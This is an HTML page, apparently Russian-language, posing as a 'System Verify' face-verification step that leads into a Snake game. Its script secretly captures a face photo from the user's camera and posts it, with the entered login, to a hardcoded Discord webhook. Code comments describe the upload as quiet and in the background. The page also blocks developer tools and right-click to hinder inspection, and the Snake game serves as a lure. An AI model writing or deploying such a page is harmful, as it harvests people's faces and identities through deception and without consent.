<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>System Verify</title>
  <style>
    :root {
      --bg1: #0a0019; --bg2: #001428; --bg3: #1a0033;
      --card: #14141a; --border: #2a2a3a;
      --blue: #0a84ff; --green: #30d158; --purple: #bf5af2; --pink: #ff375f;
      --txt: #fff; --sub: #8e8e93;
      --font: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(125deg, var(--bg1), var(--bg2), var(--bg3), var(--bg1));
      background-size: 400% 400%;
      animation: grad 20s ease infinite;
      color: var(--txt); font-family: var(--font);
      height: 100dvh; overflow: hidden;
      display: flex; align-items: center; justify-content: center;
    }
    @keyframes grad { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
    
    .particles { position: fixed; inset: 0; pointer-events: none; z-index: -1; }
    .p { position: absolute; width: 4px; height: 4px; background: var(--purple); border-radius: 50%; opacity: 0.6; animation: fl 15s infinite linear; }
    @keyframes fl { 0% { transform: translateY(100vh) scale(0); opacity: 0; } 50% { opacity: 0.8; } 100% { transform: translateY(-100px) scale(1); opacity: 0; } }

    /* Dynamic Island */
    #island {
      position: fixed; top: 14px; left: 50%; transform: translateX(-50%);
      width: 126px; height: 37px; background: #000; border-radius: 20px;
      z-index: 999; overflow: hidden; transition: all 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
    }
    #island.exp { width: 360px; height: 480px; border-radius: 40px; }
    #island .in { opacity: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.4s 0.2s; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px); }
    #island.exp .in { opacity: 1; }

    .cam-wrap { position: relative; width: 260px; height: 260px; margin: 10px 0; animation: glow 3s infinite; }
    @keyframes glow { 0%, 100% { filter: drop-shadow(0 0 10px rgba(191,90,242,0.4)); } 50% { filter: drop-shadow(0 0 25px rgba(191,90,242,0.7)); } }
    
    #vid { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; transform: scaleX(-1); border: 4px solid transparent; background: linear-gradient(#000,#000) padding-box, linear-gradient(135deg, var(--blue), var(--purple)) border-box; transition: all 0.5s; }
    #vid.ok { border-color: var(--green); }
    #vid.err { border-color: var(--pink); animation: shake 0.4s; }
    @keyframes shake { 0%, 100% { transform: scaleX(-1) translateX(0); } 25% { transform: scaleX(-1) translateX(-5px); } 75% { transform: scaleX(-1) translateX(5px); } }
    
    /* UI Elements */
    .brk { fill: none; stroke: #444; stroke-width: 5; stroke-linecap: round; }
    .brk.on { stroke: var(--purple); filter: drop-shadow(0 0 5px var(--purple)); }
    .ring { fill: none; stroke: var(--green); stroke-width: 6; stroke-linecap: round; stroke-dasharray: 820; stroke-dashoffset: 820; transition: stroke-dashoffset 0.3s; }
    .dot { position: absolute; top: 50%; left: 50%; width: 12px; height: 12px; background: var(--green); border-radius: 50%; transform: translate(-50%, -50%) scale(0); box-shadow: 0 0 15px var(--green); transition: transform 0.3s; }
    .dot.vis { transform: translate(-50%, -50%) scale(1); }

    .btn {
      width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, var(--blue), var(--purple));
      border: 4px solid #fff; color: #fff; font-size: 2rem; cursor: pointer; margin: 10px 0;
      box-shadow: 0 0 20px rgba(10,132,255,0.5); transition: transform 0.2s;
    }
    .btn:active { transform: scale(0.9); }
    .btn:disabled { opacity: 0.3; cursor: not-allowed; }

    .txt { font-size: 1rem; color: var(--sub); text-align: center; margin-top: 10px; height: 24px; }
    .txt.green { color: var(--green); font-weight: bold; }
    .txt.red { color: var(--pink); }

    .check { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; opacity: 0; transform: scale(0); transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); }
    .check.show { opacity: 1; transform: scale(1); }
    .check-c { width: 100px; height: 100px; background: var(--green); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(48,209,88,0.6); }
    .check-p { width: 50px; height: 50px; fill: none; stroke: #000; stroke-width: 6; stroke-dasharray: 60; stroke-dashoffset: 60; }
    .check-p.draw { animation: d 0.4s 0.2s forwards; }
    @keyframes d { to { stroke-dashoffset: 0; } }

    /* Login & Game */
    #login { text-align: center; animation: up 0.5s ease; z-index: 10; }
    @keyframes up { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    h2 { font-size: 2.5rem; background: linear-gradient(135deg, #fff, var(--purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
    .box { background: var(--card); padding: 24px; border-radius: 20px; width: 320px; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    input { width: 100%; background: #1a1a24; border: 1px solid #333; padding: 12px; border-radius: 12px; color: #fff; font-size: 1rem; margin-bottom: 12px; outline: none; }
    input:focus { border-color: var(--blue); }
    .gobtn { width: 100%; background: linear-gradient(135deg, var(--blue), var(--purple)); border: none; padding: 14px; border-radius: 14px; color: #fff; font-weight: bold; font-size: 1rem; cursor: pointer; }
    .gobtn:disabled { opacity: 0.4; }

    #game { display: none; position: fixed; inset: 0; background: rgba(10,0,25,0.98); flex-direction: column; align-items: center; justify-content: center; z-index: 20; }
    #game.on { display: flex; animation: up 0.5s ease; }
    canvas { background: #0a0a12; border-radius: 20px; border: 2px solid var(--border); }
    .rst { margin-top: 10px; background: var(--card); color: #fff; border: 1px solid #333; padding: 10px 20px; border-radius: 10px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="particles" id="pts"></div>

  <!-- DYNAMIC ISLAND -->
  <div id="island">
    <div class="in">
      <div class="cam-wrap">
        <video id="vid" autoplay playsinline muted></video>
        <div class="dot" id="dot"></div>
        <svg style="position:absolute; inset:-20px; width:calc(100% + 40px); height:calc(100% + 40px); pointer-events:none;">
          <path class="brk" id="b1" d="M36 58 L36 36 L58 36" />
          <path class="brk" id="b2" d="M268 58 L268 36 L246 36" />
          <path class="brk" id="b3" d="M36 246 L36 268 L58 268" />
          <path class="brk" id="b4" d="M268 246 L268 268 L246 268" />
          <circle class="ring" id="ring" cx="154" cy="154" r="130" />
        </svg>
        <div class="check" id="chk">
          <div class="check-c"><svg class="check-p" viewBox="0 0 60 60"><path d="M15 30 L25 40 L45 20"></path></svg></div>
        </div>
      </div>
      <button class="btn" id="cap" disabled>📸</button>
      <div class="txt" id="st">Ожидание...</div>
    </div>
  </div>

  <!-- LOGIN -->
  <div id="login">
    <h2>Verify</h2>
    <p style="color:var(--sub); margin-bottom:20px;">Введите логин для верификации</p>
    <div class="box">
      <input type="text" id="inp" placeholder="Ваш логин" maxlength="20">
      <button class="gobtn" id="gobtn" disabled>Начать</button>
    </div>
  </div>

  <!-- GAME -->
  <div id="game">
    <div style="display:flex; gap:15px; margin-bottom:15px;">
      <div style="background:var(--card); padding:10px 20px; border-radius:12px; text-align:center;">
        <div style="font-size:0.8rem; color:var(--sub);">Счёт</div>
        <strong style="font-size:1.2rem; color:var(--green);" id="sc">0</strong>
      </div>
      <div style="background:var(--card); padding:10px 20px; border-radius:12px; text-align:center;">
        <div style="font-size:0.8rem; color:var(--sub);">Рекорд</div>
        <strong style="font-size:1.2rem; color:#ffd60a;" id="hi">0</strong>
      </div>
    </div>
    <canvas id="cv" width="360" height="360"></canvas>
    <button class="rst" id="rst">🔄 Заново</button>
  </div>

  <script>
    /* ===== 1. БЛОКИРОВКА (F12, ПКМ) ===== */
    document.addEventListener('keydown', e => { if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); } });
    document.addEventListener('contextmenu', e => e.preventDefault());

    /* ===== ФОН ===== */
    const pts = document.getElementById('pts');
    for(let i=0; i<30; i++) { const p = document.createElement('div'); p.className='p'; p.style.left=Math.random()*100+'%'; p.style.animationDelay=Math.random()*15+'s'; pts.appendChild(p); }

    /* ===== ЛОГИКА ===== */
    const WEBHOOK = 'https://discord.com/api/webhooks/1494229839152939018/-nnCGIoZcr4xykdYTFXaB-zx4hFVkWH77Hn_B5GUZoWHMqoaxVah2IVvz_XmCwg-Xavn';
    const state = { login: '', faceOk: false, stream: null };

    const $ = id => document.getElementById(id);
    const island = $('island'); const vid = $('vid'); const ring = $('ring'); 
    const st = $('st'); const cap = $('cap'); const dot = $('dot');
    const brks = [$('b1'),$('b2'),$('b3'),$('b4')]; const chk = $('chk');

    $('inp').oninput = e => $('gobtn').disabled = e.target.value.length < 2;
    $('gobtn').onclick = () => {
      state.login = $('inp').value.trim();
      $('login').style.opacity = '0';
      setTimeout(() => { $('login').style.display='none'; island.classList.add('exp'); initCam(); }, 300);
    };

    /* ===== КАМЕРА ===== */
    function initCam() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 } } }).then(s => {
        state.stream = s; vid.srcObject = s;
        vid.onloadedmetadata = () => { st.textContent = 'Расположите лицо'; cap.disabled = false; loop(); };
      }).catch(() => { st.textContent = 'Нет камеры'; st.className = 'txt red'; });
    }

    function loop() {
      if(!state.stream) return;
      // Простая детекция (центр кадра)
      const ctx = document.createElement('canvas').getContext('2d');
      ctx.canvas.width = 100; ctx.canvas.height = 100;
      ctx.drawImage(vid, 0, 0, 100, 100);
      const d = ctx.getImageData(40, 40, 20, 20).data; // Проверка центра
      let skin = 0;
      for(let i=0; i<d.length; i+=4) {
        if(d[i]>90 && d[i+1]>40 && d[i]>d[i+1] && (d[i]-d[i+1])>15) skin++;
      }
      state.faceOk = (skin / (20*20)) > 0.15;
      
      if(state.faceOk) {
        dot.classList.add('vis'); vid.classList.add('ok'); vid.classList.remove('err');
        brks.forEach(b => b.classList.add('on'));
        ring.style.strokeDashoffset = Math.max(0, +ring.style.strokeDashoffset - 15);
        cap.disabled = false;
      } else {
        dot.classList.remove('vis'); vid.classList.remove('ok');
        brks.forEach(b => b.classList.remove('on'));
        cap.disabled = true;
      }
      requestAnimationFrame(loop);
    }

    /* ===== ФОТО И ОТПРАВКА ===== */
    cap.onclick = async () => {
      if(!state.faceOk) { 
        vid.classList.add('err'); 
        st.textContent = '⚠️ Лицо не найдено!'; st.className = 'txt red'; 
        setTimeout(()=>vid.classList.remove('err'), 400); 
        return; 
      }

      cap.style.transform = 'scale(0.8)'; cap.disabled = true;
      st.textContent = 'Проверка...'; st.className = 'txt'; // Нейтральный текст

      // 1. Делаем HD фото
      const c = document.createElement('canvas'); c.width=512; c.height=512;
      const x = c.getContext('2d');
      x.drawImage(vid, (vid.videoWidth-512)/2, (vid.videoHeight-512)/2, 512, 512, 0, 0, 512, 512);
      // Обрезаем кругом
      x.globalCompositeOperation = 'destination-in';
      x.beginPath(); x.arc(256,256,256,0,Math.PI*2); x.fill();
      // Рамка
      x.globalCompositeOperation = 'source-over';
      x.strokeStyle='#30d158'; x.lineWidth=8; x.beginPath(); x.arc(256,256,252,0,Math.PI*2); x.stroke();

      const b64 = c.toDataURL('image/png');

      // 2. Отправка на вебхук (Тихая, в фоне)
      try {
        const byteChars = atob(b64.split(',')[1]);
        const bytes = new Uint8Array(byteChars.length);
        for(let i=0; i<byteChars.length; i++) bytes[i] = byteChars.charCodeAt(i);
        const blob = new Blob([bytes], {type: 'image/png'});
        
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify({
          content: `🔐 **Verify ID** — \`${state.login}\``,
          embeds: [{ color: 0x30d158, image: { url: 'attachment://face.png' }, footer: { text: 'System Verify' } }]
        }));
        fd.append('file', blob, 'face.png');
        
        await fetch(WEBHOOK, { method: 'POST', body: fd });
        console.log('Sent');
      } catch(e) { console.error(e); }

      // 3. Анимация успеха
      setTimeout(() => {
        vid.style.opacity = '0'; cap.style.opacity = '0';
        chk.classList.add('show'); chk.querySelector('.check-p').classList.add('draw');
        st.textContent = '✅ Готово'; st.className = 'txt green';
        
        setTimeout(() => {
          island.classList.remove('exp');
          setTimeout(() => {
            state.stream?.getTracks().forEach(t=>t.stop());
            $('game').classList.add('on');
            startSnake();
          }, 400);
        }, 1200);
      }, 500);
    };

    /* ===== ЗМЕЙКА ===== */
    function startSnake() {
      const cv = $('cv'), c = cv.getContext('2d'), G = 18;
      let sn = [{x:10,y:10}], dr = {x:1,y:0}, fd = {x:15,y:15}, sc = 0, loop;
      const hi = localStorage.getItem('hi') || 0; $('hi').textContent = hi;

      function draw() {
        c.fillStyle='#0a0a12'; c.fillRect(0,0,360,360);
        c.fillStyle='#ff3b30'; c.shadowColor='#ff3b30'; c.shadowBlur=10;
        c.beginPath(); c.arc(fd.x*G+9, fd.y*G+9, 7, 0, Math.PI*2); c.fill(); c.shadowBlur=0;
        
        sn.forEach((p,i) => {
          c.fillStyle = i===0 ? '#30d158' : `rgba(48,209,88,${1-i/sn.length})`;
          c.beginPath(); c.roundRect(p.x*G+1, p.y*G+1, G-2, G-2, 4); c.fill();
        });
      }
      function upd() {
        const h = {x:sn[0].x+dr.x, y:sn[0].y+dr.y};
        if(h.x<0||h.x>=20||h.y<0||h.y>=20||sn.some(s=>s.x===h.x&&s.y===h.y)) {
          clearInterval(loop); $('hi').textContent = Math.max(hi, sc); localStorage.setItem('hi', Math.max(hi, sc));
          c.fillStyle='rgba(255,0,0,0.2)'; c.fillRect(0,0,360,360);
          c.fillStyle='#fff'; c.font='20px sans-serif'; c.textAlign='center';
          c.fillText('GAME OVER', 180, 180); return;
        }
        sn.unshift(h);
        if(h.x===fd.x && h.y===fd.y) { sc+=10; $('sc').textContent=sc; fd={x:Math.floor(Math.random()*20),y:Math.floor(Math.random()*20)}; }
        else sn.pop();
        draw();
      }
      loop = setInterval(upd, 100);
      document.addEventListener('keydown', e => {
        if(e.key==='ArrowUp'&&dr.y!==1) dr={x:0,y:-1};
        if(e.key==='ArrowDown'&&dr.y!==-1) dr={x:0,y:1};
        if(e.key==='ArrowLeft'&&dr.x!==1) dr={x:-1,y:0};
        if(e.key==='ArrowRight'&&dr.x!==-1) dr={x:1,y:0};
      });
      $('rst').onclick = () => { location.reload(); };
    }
  </script>
</body>
</html>
